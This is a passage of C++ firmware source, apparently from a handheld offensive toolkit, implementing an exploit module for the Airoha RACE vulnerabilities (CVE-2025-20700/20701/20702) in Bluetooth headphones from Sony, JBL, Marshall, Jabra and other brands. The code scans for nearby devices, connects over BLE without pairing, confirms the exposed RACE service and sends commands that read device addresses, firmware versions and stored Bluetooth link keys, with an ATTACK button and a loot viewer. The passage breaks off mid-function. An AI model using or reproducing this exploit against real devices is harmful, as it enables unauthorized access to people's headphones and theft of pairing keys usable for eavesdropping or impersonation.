// ═══════════════════════════════════════════════════════════════════════════
// Airoha RACE Exploit Module — CVE-2025-20700/20701/20702
// Unauthenticated BLE GATT access to Airoha-based BT audio devices
// Targets: Sony XM4/XM5/XM6, Marshall, JBL, Jabra, Beyerdynamic, etc.
//
// RACE protocol: 6-byte header + payload over BLE GATT write/notify
// No pairing required. Full link key extraction, flash dump, intel.
//
// UX Flow (matches WhisperPair):
//   1. Scan → BLE scan, collect named devices
//   2. Device List → user taps to select
//   3. Probe → GATT connect, check for RACE service, show result
//   4. Probe Result → VULNERABLE / NO SERVICE / UNREACHABLE + ATTACK button
//   5. Attack → run RACE commands, scrolling log
//   6. Report → 2-page summary + raw hex, SAVE button
//
// Created: 2026-03-30
// ═══════════════════════════════════════════════════════════════════════════

#include <Arduino.h>
#include "airoha_race.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "icon.h"
#include <BLEDevice.h>
#include <SPI.h>
#include <SD.h>
#include <WiFi.h>
#include "esp_bt.h"
#include "spi_manager.h"
#include "wp_loot_viewer.h"

// ═══════════════════════════════════════════════════════════════════════════
// RACE PROTOCOL CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════

#define RACE_HEAD_STANDARD   0x05
#define RACE_TYPE_REQUEST    0x5A
#define RACE_TYPE_RESPONSE   0x5B
#define RACE_HEADER_SIZE     6

#define RACE_CMD_SDK_VERSION       0x0301
#define RACE_CMD_FLASH_READ        0x0403
#define RACE_CMD_GET_LINK_KEY      0x0CC0
#define RACE_CMD_GET_BD_ADDR       0x0CD5
#define RACE_CMD_BUILD_VERSION     0x1E08

// ═══════════════════════════════════════════════════════════════════════════
// GATT UUIDs
// ═══════════════════════════════════════════════════════════════════════════

static BLEUUID airohaServiceUUID("5052494D-2DAB-0341-6972-6F6861424C45");
static BLEUUID airohaTxUUID("43484152-2DAB-3241-6972-6F6861424C45");
static BLEUUID airohaRxUUID("43484152-2DAB-3141-6972-6F6861424C45");

static BLEUUID sonyServiceUUID("dc405470-a351-4a59-97d8-2e2e3b207fbb");
static BLEUUID sonyTxUUID("bfd869fa-a3f2-4c2f-bcff-3eb1ec80cead");
static BLEUUID sonyRxUUID("2a6b6575-faf6-418c-923f-ccd63a56d955");

namespace AirohaRace {

// ═══════════════════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════

#define AR_MAX_DEVICES     16
#define AR_LINE_HEIGHT     16
#define AR_MAX_VISIBLE     12
#define AR_SCAN_SECS       8
#define AR_NOTIF_BUF_SIZE  200
#define AR_ATK_LOG_LINES   10
#define AR_ATK_LOG_WIDTH   36

// ═══════════════════════════════════════════════════════════════════════════
// PROBE RESULT CODES (matches WhisperPair pattern)
// ═══════════════════════════════════════════════════════════════════════════

#define ARR_NONE          0   // Not probed yet
#define ARR_UNREACHABLE   1   // GATT connection failed
#define ARR_NO_SERVICE    2   // RACE service not found
#define ARR_VULNERABLE    3   // RACE service found — exploitable

// ═══════════════════════════════════════════════════════════════════════════
// DATA STRUCTURES
// ═══════════════════════════════════════════════════════════════════════════

struct RaceDevice {
    char     addrStr[18];
    esp_ble_addr_type_t addrType;
    int      rssi;
    char     name[24];
    uint8_t  result;              // ARR_* probe result
    bool     isSonyVariant;
};

struct RaceIntelResult {
    char     sdkVersion[32];
    bool     hasSdkVersion;
    uint8_t  brEdrAddr[6];
    bool     hasBrEdr;
    char     buildVersion[32];
    bool     hasBuildVersion;
    uint8_t  linkKeyData[128];
    size_t   linkKeyLen;
    bool     hasLinkKeys;
    int      linkKeyCount;
};

// ═══════════════════════════════════════════════════════════════════════════
// MODULE STATE
// ═══════════════════════════════════════════════════════════════════════════

static bool arInit = false;
static bool arExit = false;
static bool inResult = false;          // Showing probe result screen
static bool inAttack = false;          // Running attack
static bool inAttackResult = false;    // Showing attack report
static bool inLootViewer = false;      // Loot viewer active

// Device list
static RaceDevice arDevs[AR_MAX_DEVICES];
static int arDevCount = 0;
static int arCurIdx = 0;
static int arListStart = 0;
static int arProbeIdx = -1;

// BLE handles
static BLEScan* pArScan = nullptr;
static BLEClient* pArClient = nullptr;
static BLERemoteCharacteristic* pArTx = nullptr;
static BLERemoteCharacteristic* pArRx = nullptr;

// Notification buffer
static volatile bool     arNotifRx = false;
static uint8_t           arNotifData[AR_NOTIF_BUF_SIZE];
static volatile size_t   arNotifLen = 0;

// Intel results
static RaceIntelResult arIntel;

// Attack log
static char arAtkLog[AR_ATK_LOG_LINES][AR_ATK_LOG_WIDTH];
static uint16_t arAtkLogColors[AR_ATK_LOG_LINES];
static int arAtkLogCount = 0;

// Report paging
static int arReportPage = 0;

// Forward declarations
static void arDrawReport();
static void arDrawList();
static void arDrawResult();

// ═══════════════════════════════════════════════════════════════════════════
// CLASSIC BT MEMORY RELEASE
// ═══════════════════════════════════════════════════════════════════════════

static bool arClassicBtReleased = false;
static void arReleaseClassicBt() {
    if (!arClassicBtReleased) {
        esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
        if (err == ESP_OK) {
            arClassicBtReleased = true;
            #if CYD_DEBUG
            Serial.printf("[RACE] Classic BT memory released, heap: %u\n", ESP.getFreeHeap());
            #endif
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// NOTIFICATION CALLBACK
// ═══════════════════════════════════════════════════════════════════════════

static void arNotifyCb(BLERemoteCharacteristic* pChar,
                       uint8_t* data, size_t len, bool isNotify) {
    size_t copyLen = (len > AR_NOTIF_BUF_SIZE) ? AR_NOTIF_BUF_SIZE : len;
    memcpy(arNotifData, data, copyLen);
    arNotifLen = copyLen;
    arNotifRx = true;
    #if CYD_DEBUG
    Serial.printf("[RACE] Notification: %d bytes\n", (int)len);
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// RACE PROTOCOL LAYER
// ═══════════════════════════════════════════════════════════════════════════

static bool raceSendCmd(uint16_t cmdId, const uint8_t* payload, size_t payloadLen) {
    if (!pArTx) return false;

    uint8_t pkt[RACE_HEADER_SIZE + 32];
    if (payloadLen > 32) return false;

    uint16_t length = (uint16_t)(payloadLen + 2);

    pkt[0] = RACE_HEAD_STANDARD;
    pkt[1] = RACE_TYPE_REQUEST;
    pkt[2] = (uint8_t)(length & 0xFF);
    pkt[3] = (uint8_t)(length >> 8);
    pkt[4] = (uint8_t)(cmdId & 0xFF);
    pkt[5] = (uint8_t)(cmdId >> 8);

    if (payloadLen > 0 && payload) {
        memcpy(&pkt[6], payload, payloadLen);
    }

    size_t total = RACE_HEADER_SIZE + payloadLen;
    arNotifRx = false;
    arNotifLen = 0;

    if (pArTx->canWrite()) {
        pArTx->writeValue(pkt, total, true);
    } else {
        pArTx->writeValue(pkt, total, false);
    }

    #if CYD_DEBUG
    Serial.printf("[RACE] Sent cmd 0x%04X, %d bytes\n", cmdId, (int)total);
    #endif
    return true;
}

static bool raceWaitResponse(uint32_t timeoutMs) {
    unsigned long t0 = millis();
    while (millis() - t0 < timeoutMs && !arNotifRx) {
        delay(20);
    }
    return arNotifRx;
}

static uint8_t* raceParseResponse(uint16_t expectedCmdId, size_t* outPayloadLen) {
    if (arNotifLen < RACE_HEADER_SIZE) return nullptr;
    if (arNotifData[0] != RACE_HEAD_STANDARD) return nullptr;
    if (arNotifData[1] != RACE_TYPE_RESPONSE) return nullptr;

    uint16_t respCmd = (uint16_t)arNotifData[4] | ((uint16_t)arNotifData[5] << 8);
    if (respCmd != expectedCmdId) return nullptr;

    uint16_t length = (uint16_t)arNotifData[2] | ((uint16_t)arNotifData[3] << 8);
    size_t payloadLen = (length >= 2) ? (length - 2) : 0;
    if (RACE_HEADER_SIZE + payloadLen > arNotifLen) {
        payloadLen = arNotifLen - RACE_HEADER_SIZE;
    }

    if (outPayloadLen) *outPayloadLen = payloadLen;
    return &arNotifData[RACE_HEADER_SIZE];
}

// ═══════════════════════════════════════════════════════════════════════════
// ATTACK LOG
// ═══════════════════════════════════════════════════════════════════════════

static void arLogAdd(const char* msg, uint16_t color) {
    if (arAtkLogCount < AR_ATK_LOG_LINES) {
        strncpy(arAtkLog[arAtkLogCount], msg, AR_ATK_LOG_WIDTH - 1);
        arAtkLog[arAtkLogCount][AR_ATK_LOG_WIDTH - 1] = '\0';
        arAtkLogColors[arAtkLogCount] = color;
        arAtkLogCount++;
    } else {
        for (int i = 0; i < AR_ATK_LOG_LINES - 1; i++) {
            memcpy(arAtkLog[i], arAtkLog[i + 1], AR_ATK_LOG_WIDTH);
            arAtkLogColors[i] = arAtkLogColors[i + 1];
        }
        strncpy(arAtkLog[AR_ATK_LOG_LINES - 1], msg, AR_ATK_LOG_WIDTH - 1);
        arAtkLog[AR_ATK_LOG_LINES - 1][AR_ATK_LOG_WIDTH - 1] = '\0';
        arAtkLogColors[AR_ATK_LOG_LINES - 1] = color;
    }
}

static void arDrawAtkLog() {
    int startY = 98;
    int lineH = 15;
    int drawCount = (arAtkLogCount < AR_ATK_LOG_LINES) ? arAtkLogCount : AR_ATK_LOG_LINES;
    tft.fillRect(0, startY, SCREEN_WIDTH, AR_ATK_LOG_LINES * lineH, HALEHOUND_BLACK);
    for (int i = 0; i < drawCount; i++) {
        tft.setTextColor(arAtkLogColors[i]);
        tft.setCursor(5, startY + i * lineH);
        tft.print(arAtkLog[i]);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void arDrawHeader() {
    tft.drawLine(0, 19, tft.width(), 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.drawBitmap(210, 20, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawBitmap(112, 20, bitmap_icon_sdcard, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
    drawGlitchTitle(55, "AIROHA RACE");
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    int cveW = 14 * 6;
    tft.setCursor((SCREEN_WIDTH - cveW) / 2, 68);
    tft.print("CVE-2025-20700");
}

static void arDrawList() {
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("BLE Devices: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(arDevCount);
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);

    if (arDevCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 105);
        tft.print("No devices found.");
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(10, 125);
        tft.print("Ensure BT headphones are");
        tft.setCursor(10, 138);
        tft.print("powered on and nearby.");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(5, SCREEN_HEIGHT - 12);
        tft.print("SEL=Rescan  BACK=Exit");
        return;
    }

    int y = 98;
    for (int i = 0; i < AR_MAX_VISIBLE && i + arListStart < arDevCount; i++) {
        int idx = i + arListStart;
        RaceDevice& d = arDevs[idx];

        if (idx == arCurIdx) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, AR_LINE_HEIGHT, HALEHOUND_DARK);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(5, y);
            tft.print("> ");
        } else {
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(5, y);
            tft.print("  ");
        }

        tft.setCursor(20, y);
        String nm = String(d.name).substring(0, 14);
        tft.print(nm);

        // Show probe result if already probed
        if (d.result != ARR_NONE) {
            tft.setCursor(SCREEN_WIDTH - 65, y);
            if (d.result == ARR_VULNERABLE) {
                tft.setTextColor(0xF800);
                tft.print("VULN");
            } else if (d.result == ARR_NO_SERVICE) {
                tft.setTextColor(0x07E0);
                tft.print("SAFE");
            } else {
                tft.setTextColor(HALEHOUND_GUNMETAL);
                tft.print("--");
            }
        } else {
            tft.setCursor(SCREEN_WIDTH - 50, y);
            tft.setTextColor(HALEHOUND_VIOLET);
            tft.print(d.rssi);
            tft.print("dB");
        }

        y += AR_LINE_HEIGHT;
    }

    tft.drawLine(0, SCREEN_HEIGHT - 18, SCREEN_WIDTH, SCREEN_HEIGHT - 18, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("SEL=Probe UP/DN=Nav L=Scan");
}

static void arDrawProbeStatus(int line, const char* msg, uint16_t col) {
    int y = 135 + line * 15;
    tft.fillRect(0, y, SCREEN_WIDTH, 14, HALEHOUND_BLACK);
    tft.setTextColor(col);
    tft.setCursor(10, y);
    tft.print(msg);
}

static const char* arResultStr(uint8_t r) {
    switch (r) {
        case ARR_UNREACHABLE: return "UNREACHABLE";
        case ARR_NO_SERVICE:  return "NO RACE SERVICE";
        case ARR_VULNERABLE:  return "VULNERABLE";
        default:              return "NOT TESTED";
    }
}

static uint16_t arResultColor(uint8_t r) {
    switch (r) {
        case ARR_NO_SERVICE:  return 0x07E0;   // Green
        case ARR_VULNERABLE:  return 0xF800;   // Red
        default:              return HALEHOUND_GUNMETAL;
    }
}

static void arDrawResult() {
    if (arProbeIdx < 0) return;
    RaceDevice& d = arDevs[arProbeIdx];

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("PROBE RESULT");
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);

    int y = 100;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("Name: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("MAC:  ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("RSSI: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.rssi); tft.print(" dBm");
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("Type: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(d.isSonyVariant ? "Sony RACE" : "Airoha RACE");
    y += 20;

    // Result banner with rounded border
    tft.drawLine(0, y - 4, SCREEN_WIDTH, y - 4, HALEHOUND_DARK);
    uint16_t rc = arResultColor(d.result);
    tft.fillRoundRect(8, y, SCREEN_WIDTH - 16, 26, 4, rc);
    tft.drawRoundRect(7, y - 1, SCREEN_WIDTH - 14, 28, 4, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_BLACK);
    const char* rs = arResultStr(d.result);
    int tw = strlen(rs) * 6;
    tft.setCursor((SCREEN_WIDTH - tw) / 2, y + 8);
    tft.print(rs);
    y += 36;

    // Explanation text
    tft.setTextColor(HALEHOUND_MAGENTA);
    switch (d.result) {
        case ARR_VULNERABLE:
            tft.setCursor(10, y);
            tft.print("RACE GATT service exposed");
            tft.setCursor(10, y + 14);
            tft.print("No authentication required");
            tft.setCursor(10, y + 30);
            tft.setTextColor(0xF800);
            tft.print("CVE-2025-20700 CONFIRMED");
            break;
        case ARR_NO_SERVICE:
            tft.setCursor(10, y);
            tft.print("RACE service not found.");
            tft.setCursor(10, y + 14);
            tft.print("Device may be patched or");
            tft.setCursor(10, y + 28);
            tft.print("not using Airoha SoC.");
            break;
        case ARR_UNREACHABLE:
            tft.setCursor(10, y);
            tft.print("GATT connection failed.");
            tft.setCursor(10, y + 14);
            tft.print("Target may be out of range");
            break;
    }

    // Bottom bar — ATTACK button for vulnerable devices
    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK");

    if (d.result == ARR_VULNERABLE) {
        tft.fillRoundRect(140, SCREEN_HEIGHT - 34, 92, 26, 4, 0xF800);
        tft.drawRoundRect(139, SCREEN_HEIGHT - 35, 94, 28, 4, HALEHOUND_MAGENTA);
        tft.drawBitmap(146, SCREEN_HEIGHT - 29, bitmap_icon_sword, 16, 16, HALEHOUND_BLACK);
        tft.setTextColor(HALEHOUND_BLACK);
        tft.setCursor(166, SCREEN_HEIGHT - 25);
        tft.print("ATTACK");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SCAN — collect all named BLE devices (no GATT probe yet)
// ═══════════════════════════════════════════════════════════════════════════

static void arDoScan() {
    arDevCount = 0;
    arCurIdx = 0;
    arListStart = 0;

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 88);
    tft.print("[*] BLE SCAN ACTIVE");
    tft.drawLine(10, 98, 200, 98, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 108);
    tft.print("Hunting targets...");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 128);
    tft.printf("Scan duration: %ds", AR_SCAN_SECS);

    BLEScanResults results = pArScan->start(AR_SCAN_SECS, false);
    int total = results.getCount();

    #if CYD_DEBUG
    Serial.printf("[RACE] Scan found %d total BLE devices\n", total);
    #endif

    for (int i = 0; i < total && arDevCount < AR_MAX_DEVICES; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);
        if (device.getName().length() == 0) continue;
        if (device.getRSSI() < -85) continue;

        String addr = String(device.getAddress().toString().c_str());
        bool dup = false;
        for (int j = 0; j < arDevCount; j++) {
            if (addr.equals(arDevs[j].addrStr)) { dup = true; break; }
        }
        if (dup) continue;

        RaceDevice& d = arDevs[arDevCount];
        strncpy(d.addrStr, addr.c_str(), 17);
        d.addrStr[17] = '\0';
        d.addrType = device.getAddressType();
        d.rssi = device.getRSSI();
        strncpy(d.name, device.getName().c_str(), 23);
        d.name[23] = '\0';
        d.result = ARR_NONE;
        d.isSonyVariant = false;
        arDevCount++;
    }

    pArScan->clearResults();
    arDrawList();
}

// ═══════════════════════════════════════════════════════════════════════════
// GATT PROBE — user selected a device, check for RACE service
// ═══════════════════════════════════════════════════════════════════════════

static void arProbeDevice(int idx) {
    arProbeIdx = idx;
    inResult = false;
    RaceDevice& d = arDevs[idx];
    d.result = ARR_UNREACHABLE;

    if (pArScan) pArScan->stop();

    // Draw probe UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("[*] PROBING TARGET");
    tft.drawLine(5, 94, 180, 94, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 100);
    tft.print(d.name);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 115);
    tft.print(d.addrStr);

    // Disconnect previous
    if (pArClient && pArClient->isConnected()) {
        pArClient->disconnect();
        delay(300);
    }

    if (!pArClient) {
        pArClient = BLEDevice::createClient();
        if (!pArClient) {
            inResult = true;
            arDrawResult();
            return;
        }
    }

    // Connect
    arDrawProbeStatus(0, "Connecting...", HALEHOUND_HOTPINK);
    BLEAddress addr(d.addrStr);
    bool connected = pArClient->connect(addr, d.addrType);

    if (!connected) {
        #if CYD_DEBUG
        Serial.printf("[RACE] GATT connect failed: %s\n", d.addrStr);
        #endif
        inResult = true;
        arDrawResult();
        return;
    }

    arDrawProbeStatus(0, "Connected!", HALEHOUND_MAGENTA);

    // Check for RACE service — try Airoha first, then Sony
    arDrawProbeStatus(1, "Finding RACE service...", HALEHOUND_HOTPINK);
    BLERemoteService* pSvc = pArClient->getService(airohaServiceUUID);
    if (pSvc) {
        d.isSonyVariant = false;
    } else {
        pSvc = pArClient->getService(sonyServiceUUID);
        if (pSvc) {
            d.isSonyVariant = true;
        }
    }

    if (!pSvc) {
        d.result = ARR_NO_SERVICE;
        pArClient->disconnect();
        #if CYD_DEBUG
        Serial.println("[RACE] RACE service not found");
        #endif
        inResult = true;
        arDrawResult();
        return;
    }

    arDrawProbeStatus(1, "RACE Service FOUND!", 0xF800);
    delay(200);

    // Verify TX + RX characteristics exist
    arDrawProbeStatus(2, "Checking TX/RX chars...", HALEHOUND_HOTPINK);

    BLEUUID txUUID = d.isSonyVariant ? sonyTxUUID : airohaTxUUID;
    BLEUUID rxUUID = d.isSonyVariant ? sonyRxUUID : airohaRxUUID;

    BLERemoteCharacteristic* pTx = pSvc->getCharacteristic(txUUID);
    BLERemoteCharacteristic* pRx = pSvc->getCharacteristic(rxUUID);

    // Fallback: enumerate characteristics by property
    if (!pTx || !pRx) {
        auto* chars = pSvc->getCharacteristics();
        if (chars) {
            for (auto& kv : *chars) {
                BLERemoteCharacteristic* c = kv.second;
                if (!pTx && (c->canWrite() || c->canWriteNoResponse())) pTx = c;
                if (!pRx && c->canNotify()) pRx = c;
            }
        }
    }

    if (pTx && pRx) {
        d.result = ARR_VULNERABLE;
        arDrawProbeStatus(2, "TX/RX Ready — VULNERABLE", 0xF800);
    } else {
        d.result = ARR_NO_SERVICE;
        arDrawProbeStatus(2, "Chars missing — patched?", HALEHOUND_GUNMETAL);
    }

    // Stay connected — attack reuses this GATT session
    delay(500);
    inResult = true;
    arDrawResult();
}

// ═══════════════════════════════════════════════════════════════════════════
// ATTACK — run RACE intel commands (user chose to attack from probe result)
// ═══════════════════════════════════════════════════════════════════════════

static void arRunAttack() {
    if (arProbeIdx < 0 || arProbeIdx >= arDevCount) return;
    RaceDevice& d = arDevs[arProbeIdx];

    inAttack = true;
    inResult = false;
    arAtkLogCount = 0;
    memset(&arIntel, 0, sizeof(arIntel));

    // Draw attack UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(0xF800);
    tft.setCursor(5, 82);
    tft.print("ATTACKING: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    String atkName = String(d.name).substring(0, 16);
    tft.print(atkName);
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

    if (pArScan) pArScan->stop();

    // Reuse probe connection or reconnect
    if (pArClient && pArClient->isConnected()) {
        arLogAdd("Reusing probe link!", HALEHOUND_MAGENTA);
        arDrawAtkLog();
    } else {
        arLogAdd("Reconnecting...", HALEHOUND_HOTPINK);
        arDrawAtkLog();

        if (pArClient) { pArClient = nullptr; }
        if (pArScan) { pArScan = nullptr; }
        BLEDevice::deinit(false);
        delay(300);

        arReleaseClassicBt();
        BLEDevice::init("");
        delay(150);

        pArScan = BLEDevice::getScan();
        if (pArScan) {
            pArScan->setActiveScan(true);
            pArScan->setInterval(100);
            pArScan->setWindow(99);
        }

        pArClient = BLEDevice::createClient();
        if (!pArClient) {
            arLogAdd("Client create FAILED", 0xF800);
            arDrawAtkLog();
            delay(2000);
            inAttack = false;
            inResult = true;
            arDrawResult();
            return;
        }

        BLEAddress addr(d.addrStr);
        bool connected = false;
        for (int attempt = 1; attempt <= 3 && !connected; attempt++) {
            if (attempt > 1) {
                char retryBuf[28];
                snprintf(retryBuf, sizeof(retryBuf), "Retry %d/3...", attempt);
                arLogAdd(retryBuf, HALEHOUND_HOTPINK);
                arDrawAtkLog();
                delay(500);
            }
            connected = pArClient->connect(addr, d.addrType);
        }
        if (!connected) {
            arLogAdd("Connection FAILED x3", 0xF800);
            arDrawAtkLog();
            delay(2000);
            inAttack = false;
            inResult = true;
            arDrawResult();
            return;
        }

        arLogAdd("Connected!", HALEHOUND_MAGENTA);
        arDrawAtkLog();
    }

    // Find RACE service + characteristics
    arLogAdd("Finding RACE service...", HALEHOUND_HOTPINK);
    arDrawAtkLog();

    BLEUUID svcUUID = d.isSonyVariant ? sonyServiceUUID : airohaServiceUUID;
    BLEUUID txUUID = d.isSonyVariant ? sonyTxUUID : airohaTxUUID;
    BLEUUID rxUUID = d.isSonyVariant ? sonyRxUUID : airohaRxUUID;

    BLERemoteService* pSvc = pArClient->getService(svcUUID);
    if (!pSvc) {
        arLogAdd("RACE service NOT FOUND", 0xF800);
        arDrawAtkLog();
        pArClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        arDrawResult();
        return;
    }

    pArTx = pSvc->getCharacteristic(txUUID);
    pArRx = pSvc->getCharacteristic(rxUUID);

    // Fallback enumeration
    if (!pArTx || !pArRx) {
        auto* chars = pSvc->getCharacteristics();
        if (chars) {
            for (auto& kv : *chars) {
                BLERemoteCharacteristic* c = kv.second;
                if (!pArTx && (c->canWrite() || c->canWriteNoResponse())) pArTx = c;
                if (!pArRx && c->canNotify()) pArRx = c;
            }
        }
    }

    if (!pArTx || !pArRx) {
        arLogAdd("TX/RX chars NOT FOUND", 0xF800);
        arDrawAtkLog();
        pArClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        arDrawResult();
        return;
    }

    // Subscribe to notifications
    if (pArRx->canNotify()) {
        pArRx->registerForNotify(arNotifyCb);
        delay(100);
    }

    // Request larger MTU
    pArClient->setMTU(517);

    arLogAdd("RACE service locked", HALEHOUND_MAGENTA);
    arDrawAtkLog();

    // ─── Command 1: SDK Version (0x0301) ────────────────────────
    arLogAdd("--- SDK VERSION ---", 0xF800);
    arDrawAtkLog();

    if (raceSendCmd(RACE_CMD_SDK_VERSION, nullptr, 0) && raceWaitResponse(3000)) {
        size_t pLen = 0;
        uint8_t* payload = raceParseResponse(RACE_CMD_SDK_VERSION, &pLen);
        if (payload && pLen > 0) {
            size_t strStart = (pLen > 1) ? 1 : 0;
            size_t copyLen = pLen - strStart;
            if (copyLen > 31) copyLen = 31;
            memcpy(arIntel.sdkVersion, &payload[strStart], copyLen);
            arIntel.sdkVersion[copyLen] = '\0';
            arIntel.hasSdkVersion = true;
            char logBuf[AR_ATK_LOG_WIDTH];
            snprintf(logBuf, sizeof(logBuf), "SDK: %.28s", arIntel.sdkVersion);
            arLogAdd(logBuf, HALEHOUND_MAGENTA);
        } else {
            arLogAdd("SDK: parse failed", HALEHOUND_GUNMETAL);
        }
    } else {
        arLogAdd("SDK: no response", HALEHOUND_GUNMETAL);
    }
    arDrawAtkLog();

    // ─── Command 2: BD_ADDR (0x0CD5) ────────────────────────────
    arLogAdd("--- BD_ADDR ---", 0xF800);
    arDrawAtkLog();

    if (raceSendCmd(RACE_CMD_GET_BD_ADDR, nullptr, 0) && raceWaitResponse(3000)) {
        size_t pLen = 0;
        uint8_t* payload = raceParseResponse(RACE_CMD_GET_BD_ADDR, &pLen);
        if (payload && pLen >= 8) {
            for (int i = 0; i < 6; i++) {
                arIntel.brEdrAddr[i] = payload[2 + (5 - i)];
            }
            arIntel.hasBrEdr = true;
            char brStr[32];
            snprintf(brStr, sizeof(brStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                     arIntel.brEdrAddr[0], arIntel.brEdrAddr[1],
                     arIntel.brEdrAddr[2], arIntel.brEdrAddr[3],
                     arIntel.brEdrAddr[4], arIntel.brEdrAddr[5]);
            arLogAdd(brStr, 0xF800);
        } else {
            arLogAdd("BD_ADDR: parse failed", HALEHOUND_GUNMETAL);
        }
    } else {
        arLogAdd("BD_ADDR: no response", HALEHOUND_GUNMETAL);
    }
    arDrawAtkLog();

    // ─── Command 3: Build Version (0x1E08) ──────────────────────
    arLogAdd("--- BUILD VERSION ---", 0xF800);
    arDrawAtkLog();

    if (raceSendCmd(RACE_CMD_BUILD_VERSION, nullptr, 0) && raceWaitResponse(3000)) {
        size_t pLen = 0;
        uint8_t* payload = raceParseResponse(RACE_CMD_BUILD_VERSION, &pLen);
        if (payload && pLen > 0) {
            size_t strStart = (pLen > 1) ? 1 : 0;
            size_t copyLen = pLen - strStart;
            if (copyLen > 31) copyLen = 31;
            memcpy(arIntel.buildVersion, &payload[strStart], copyLen);
            arIntel.buildVersion[copyLen] = '\0';
            arIntel.hasBuildVersion = true;
            char logBuf[AR_ATK_LOG_WIDTH];
            snprintf(logBuf, sizeof(logBuf), "Build: %.24s", arIntel.buildVersion);
            arLogAdd(logBuf, HALEHOUND_MAGENTA);
        } else {
            arLogAdd("Build: parse failed", HALEHOUND_GUNMETAL);
        }
    } else {
        arLogAdd("Build: no response", HALEHOUND_GUNMETAL);
    }
    arDrawAtkLog();

    // ─── Command 4: Link Key Extraction (0x0CC0) ────────────────
    arLogAdd("--- LINK KEYS ---", 0xF800);
    arDrawAtkLog();

    if (raceSendCmd(RACE_CMD_GET_LINK_KEY, nullptr, 0) && raceWaitResponse(5000)) {
        size_t pLen = 0;
        uint8_t* payload = raceParseResponse(RACE_CMD_GET_LINK_KEY, &pLen);
        if (payload && pLen >= 3) {
            int numDevices = payload[1];
            arIntel.linkKeyCount = numDevices;
            size_t dataLen = pLen - 3;
            if (dataLen > 128) dataLen = 128;
            memcpy(arIntel.linkKeyData, &payload[3], dataLen);
            arIntel.linkKeyLen = dataLen;
            arIntel.hasLinkKeys = (numDevices > 0);
            char logBuf[AR_ATK_LOG_WIDTH];
